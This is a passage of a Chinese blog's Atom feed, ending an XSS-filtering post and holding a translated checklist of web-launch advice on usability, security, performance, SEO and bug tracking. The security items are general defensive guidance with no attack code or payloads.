</code></pre><p>算了，装不下去了。自己也B不清楚，所以下面是广告时间。请使劲戳下面链接。</p>
<p>经典文章：<a href="http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3/" target="_blank" rel="external">http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3/</a></p>
<p>学习地址：<br><a href="http://bbs.ikaka.com/showtopic-8625758.aspx" target="_blank" rel="external">http://bbs.ikaka.com/showtopic-8625758.aspx</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;没想到这样一个问题，还把自己搞得有点昏了。不过在找寻答案的过程中，我知道自己是快乐的！虽然没有自己解答出这个问题，但是收获颇多。特别是看了人家一步一步思考问题的方式，感悟是大大的。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;xss作为web前端常用的注入漏洞，在现在的互联网业务中其危险性不亚于其他攻击方式，请编写过滤函数&lt;br&gt;1.通过异步请求拿到的json数据后，如何安全的使用innerHtml显示在页面上&lt;br&gt;2.浏览器地址栏直接获取的参数，如何安全地进行document.write&lt;br&gt;3.后台直接输出完整的html页面，如何保证页面渲染后，用户内容的&amp;lt; script &amp;gt;不被执行.&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://blog.zchub.cn/tags/front-end/"/>
    
      <category term="xss" scheme="http://blog.zchub.cn/tags/xss/"/>
    
      <category term="hook" scheme="http://blog.zchub.cn/tags/hook/"/>
    
      <category term="前端安全" scheme="http://blog.zchub.cn/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web应用编程者在发布站点应该注意的细节</title>
    <link href="http://blog.zchub.cn/2015/08/27/what-technical-detail-should-programmer-consider-in-making-site/"/>
    <id>http://blog.zchub.cn/2015/08/27/what-technical-detail-should-programmer-consider-in-making-site/</id>
    <published>2015-08-27T22:23:00.000Z</published>
    <updated>2016-09-25T03:11:05.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>翻译原文地址：<a href="http://programmers.stackexchange.com/questions/46716/what-technical-details-should-a-programmer-of-a-web-application-consider-before" target="_blank" rel="external">戳这里</a></p>
<h2 id="译"><a href="#译" class="headerlink" title="译"></a>译</h2><p>这里可能大多数在列表中你已经知道，但是可能有一两条你原来没有见过。不要完全理解，否则可能从来没有听说过。</p>
<h4 id="接口和用户体验"><a href="#接口和用户体验" class="headerlink" title="接口和用户体验"></a>接口和用户体验</h4><ul>
<li>保证你的站点兼容主流浏览器. 如Gecko engine (Firefox), a WebKit engine (Safari和手机浏览器),Chrome, 你支持IE浏览器(最好兼容性VPC图像),和Opera. 在不同操作系统上浏览器如何渲染你的站点</li>
<li>考虑用户可能不使用主流浏览器：如cell phones, screen readers and search engines和其他一些信息工具WAIandSection508, Mobile development:MobiForge</li>
<li>阶段：怎样发布更新而不影响你的用户。有一个或多个测试或分段环境，可实现对体系结构、代码或扫描内容的更改，并确保它们可以被部署在一个没有破坏任何东西的控制方式中。有一个自动化的方式，然后部署到现场的现场现场。而最有效实现这些东西是使用控制版本系统（CVS、Subversion等）和自动构建工具(Ant, NAnt等).</li>
<li>不要直接给用户展示不友好的错误</li>
<li>不要在页面中展示用户的邮件地址不然他们会收到太多的垃圾邮件</li>
<li>添加rel=”nofollow”属性让用户的链接避免垃圾留言</li>
<li>在你的站点中建立精细的限制（同属于安全问题）</li>
<li>学习怎么样渐进增强</li>
<li>重定向一个post请求如果这个post请求成功来防止刷新再一次提交</li>
<li>不要忘记可访问这个用户。在法律上这是必要的。WAI-ARIA和WCAG 2是这方面的好的资源</li>
<li>Don’t make me think</li>
</ul>
<a id="more"></a>
<h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><ul>
<li>这里有太多内容，但是OWASP发展指导从上到下包含了web站点的安全</li>
<li>了解注入特别是sql注入，以及怎样防御它</li>
<li>不要相信用户的输入信息和请求中的信息（包含cookie和字段中隐藏值）</li>
<li>先撒“佐料”（加密），然后再散列密码。并采用不同的加密方式来避免rainbow攻击。使用一个慢散列算法，如bcrypt（时间测试）或scrypt（更安全，但是更新）来保存密码。（怎么安全保存A密码）。NIST提出了PBKDF2来散列密码，避免直接使用MD5或SHA。、</li>
<li>尽量不要提出你自己的花哨的认证系统。它更容易变得微妙并不可测试，甚至你被黑了你也不知道。</li>
<li>了解信用卡的规则</li>
<li>使用SSL/HTTPS来进行登录和其他需要敏感数据的页面。</li>
<li>防止session攻击</li>
<li>避免跨脚本攻击cross site scripting(XSS).</li>
<li>避免跨站点请求cross site request forgeries(CSRF).</li>
<li>避免点击劫持Clickjacking.</li>
<li>让你的系统保存更新到你最近一次修改</li>
<li>保证你的数据库连接信息安全</li>
<li>了解最新的攻击技术和漏洞来完善你的平台</li>
<li>阅读google浏览器安全手册</li>
<li>阅读web应用黑客手册</li>
<li>了解最小特权原则，尝试去允许你的app服务器在没有权限的情况下</li>
</ul>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><ul>
<li>如果必要实现缓存，熟悉并使用HTTP缓存和HTML5 Manifest.</li>
<li>优化图片。不要使用一张20kb的图片当背景</li>
<li>学习怎么样压缩内容</li>
<li>合并多个css文件（stylesheets）和脚本文件（script）来减少浏览器连接的数量并提高压缩的能力来压缩重复的文件</li>
<li>看哈雅虎优化站点，大量的指导。包含了提高前端的表现性能和他们的YSlow工具（包含了firefox,safari,chrome和opera）,同时google页面测试来进行性能分析同时他也会优化你的图片。</li>
<li>使用css精灵（css sprites）对于小的关联的图片如导航栏（最小化http请求）</li>
<li>针对访问量大的网站应该分域部署部件</li>
<li>静态内容 (i.e. images, CSS, JavaScript, 和不需要通过cookie访问的内容) 应该在一个分开的域并不使用cookie，因为一个域的所有cookie和它的子域会在包含每个请求中来访问这个域。一个好的方法是使用CDN（content delivery network）.但是考虑到CDN方式有可能失效在可选择域中，所以可以用本地拷贝来代替</li>
<li>最小化http请求数量让浏览器来渲染页面</li>
<li>在JavaScript中利用google 闭包编译器和其他最小化的工具</li>
<li>保证站点的根目录下有favicon.ico文件。浏览器会自动请求这个文件。即使这个图标没有在html出现。如果你没有favicon.ico将会导致大量的404错误，耗费你服务器的带宽。</li>
</ul>
<h4 id="SEO-优化搜索引擎"><a href="#SEO-优化搜索引擎" class="headerlink" title="SEO (优化搜索引擎)"></a>SEO (优化搜索引擎)</h4><ul>
<li>使用对搜索引擎友好的url.。如使用example.com/pages/45-article-title代替example.com/index.php?page=45</li>
<li>当使用“#”来代替动态内容的时候使用‘！#’代替‘#’，在服务器端googlebot(google页面机器人)使用$_REQUEST[“_escaped<em>fragment</em>“]代替“！#”，其他的如./#!page=1 变为了./?_escaped<em>fragments</em>=page=1。用户可能使用FF4或者Chromium；ls一个是好的命令。所以即使这个页面地址栏已经改变页面也没有重载。你可以使用？代替！#来保存动态的内容同时告诉服务器当你发邮件是这个链接是在页面的最后，AJAX 不需要其他的请求。</li>
<li>不要使用链接如“click here”.你失去了一个SEO的机会，对于屏幕阅读者来说更难。</li>
<li>拥有XML 站点图,最好默认路径为/sitemap.xml.</li>
<li>使用<link rel="canonical" ...="">当你有很多链接指向同一内容时，这个问题能够在Google Webmaster Tools上得到解决</li>
<li>使用Google Webmaster 和Bing Webmaster .</li>
<li>在开始安装Google Analytics（或者开源工具Piwik）</li>
<li>了解robot.text以及搜索引擎蜘蛛如何工作的</li>
<li>重定向请求（使用301永久移除）从www.example.com到example.com来防止在所有站点中降低排名</li>
<li>了解会有表现怪异的引擎蜘蛛</li>
<li>如果你又非分本内容在谷歌的地图扩展视频等，这有一些比较好的消息在Tim Farley’s answer中。</li>
</ul>
<h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><ul>
<li>了解http和诸如GET, POST, sessions, cookies等，并了解“无状态”的意义</li>
<li>根据w3c规则书写自己的XHTML/HTML和CSS并保证他们有效。目的是为了避免浏览器的怪异模式。这样他们就能在非传统的浏览器上运行，如屏幕阅读器和手机设备。</li>
<li>了解JavaScript在浏览器中的运行过程</li>
<li>了解在你页面中的JavaScript和层叠样式以及其他资源如何加载并思考如何提高性能。将script脚本放置在页面的底部已被广泛认同如解析apps or HTML5 shims.</li>
<li>了解JavaScript的沙箱（sandbox）,特别是你要使用iframe</li>
<li>意识到JavaScript可能现在能运行但将来可能会失效，所以Ajax就被扩展了，而不是一个基础。甚至大多数用户都远离它了，记住noscript(无脚本，静态页面【我的理解】)越来越流行，手机设备可能不会按照期望运行，而且google访问你的站点时将不会运行你的大多数JavaScript文件</li>
<li>学习301与302重定向的区别（SEO问题）</li>
<li>尽量多地学习部署平台</li>
<li>考虑使用重叠样式表和普通css</li>
<li>学习javascript框架（如jQuery,MooTools,Prototype,Dojo或者YUI 3），将会隐藏多数浏览器差别当操作DOM时</li>
<li>优化和js框架一起运用，考虑使用服务如google library API来加载框架。所以浏览器能够使用框架的备份已经在浏览器中缓存而不是从你的站点下载一个重复的文件</li>
<li>不要重复造轮子。在做任何事前搜索一个组件或者例子了解怎么完成它，有９９％的可能有人已经做过并发布了开源代码</li>
<li>另一方面，你决定你需要什么之前不需要太多东西。特别是在客户端网络，它几乎总是更重要的是要保持东西轻，快速，灵活。</li>
</ul>
<h4 id="Bug修复"><a href="#Bug修复" class="headerlink" title="Bug修复"></a>Bug修复</h4><ul>
<li>明白你将使用２０％的时间来编码。８０％的时间来完善它，所以有针对性</li>
<li>建立一个好的错误报告方式。</li>
<li>为人们新建一个系统来提出建议和意见</li>
<li>经常备份(确保这些备份都是功能性的)，要有恢复策略不止是备份策略</li>
<li>使用版本控制系统来保存你的文件，如git、subversion、Mercurial等</li>
<li>不要忘记验收测试，如Selenium框架。除非你完全自动化测试，可能使用一个连续整合的工具，如Jenkins.</li>
<li>确保你的系统使用了日志框架，如log4j,log4net或者log4r。如果你的站点出了什么问题，你可以及时查看</li>
<li>记录日志的时候捕捉你处理过的异常和没有处理的异常。总结/分析    输出日志。它将展示出你的站点的关键问题。</li>
</ul>
<h4 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h4><ul>
<li>实现服务器端和客户端的监控和分析（应该主动而不是被动）</li>
<li>使用诸如userservice和Intercom 等服务来与你的用户联系</li>
<li>采用Vincent Driessen’s Git branching model</li>
</ul>
<p>大多数遗漏的东西并不是很有效，也有可能他们太详细，不在范围之内，或者与其他人了解的差不多。请随时补充，可能我也有遗留的地方或者有些错误。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;翻译原文地址：&lt;a href=&quot;http://programmers.stackexchange.com/questions/46716/what-technical-details-should-a-programmer-of-a-web-application-consider-before&quot;&gt;戳这里&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;译&quot;&gt;&lt;a href=&quot;#译&quot; class=&quot;headerlink&quot; title=&quot;译&quot;&gt;&lt;/a&gt;译&lt;/h2&gt;&lt;p&gt;这里可能大多数在列表中你已经知道，但是可能有一两条你原来没有见过。不要完全理解，否则可能从来没有听说过。&lt;/p&gt;
&lt;h4 id=&quot;接口和用户体验&quot;&gt;&lt;a href=&quot;#接口和用户体验&quot; class=&quot;headerlink&quot; title=&quot;接口和用户体验&quot;&gt;&lt;/a&gt;接口和用户体验&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;保证你的站点兼容主流浏览器. 如Gecko engine (Firefox), a WebKit engine (Safari和手机浏览器),Chrome, 你支持IE浏览器(最好兼容性VPC图像),和Opera. 在不同操作系统上浏览器如何渲染你的站点&lt;/li&gt;
&lt;li&gt;考虑用户可能不使用主流浏览器：如cell phones, screen readers and search engines和其他一些信息工具WAIandSection508, Mobile development:MobiForge&lt;/li&gt;
&lt;li&gt;阶段：怎样发布更新而不影响你的用户。有一个或多个测试或分段环境，可实现对体系结构、代码或扫描内容的更改，并确保它们可以被部署在一个没有破坏任何东西的控制方式中。有一个自动化的方式，然后部署到现场的现场现场。而最有效实现这些东西是使用控制版本系统（CVS、Subversion等）和自动构建工具(Ant, NAnt等).&lt;/li&gt;
&lt;li&gt;不要直接给用户展示不友好的错误&lt;/li&gt;
&lt;li&gt;不要在页面中展示用户的邮件地址不然他们会收到太多的垃圾邮件&lt;/li&gt;
&lt;li&gt;添加rel=”nofollow”属性让用户的链接避免垃圾留言&lt;/li&gt;
&lt;li&gt;在你的站点中建立精细的限制（同属于安全问题）&lt;/li&gt;
&lt;li&gt;学习怎么样渐进增强&lt;/li&gt;
&lt;li&gt;重定向一个post请求如果这个post请求成功来防止刷新再一次提交&lt;/li&gt;
&lt;li&gt;不要忘记可访问这个用户。在法律上这是必要的。WAI-ARIA和WCAG 2是这方面的好的资源&lt;/li&gt;
&lt;li&gt;Don’t make me think&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="blog" scheme="http://blog.zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://blog.zchub.cn/tags/front-end/"/>
    
      <category term="article_tanslate" scheme="http://blog.zchub.cn/tags/article-tanslate/"/>
    
  </entry>
  
</feed>
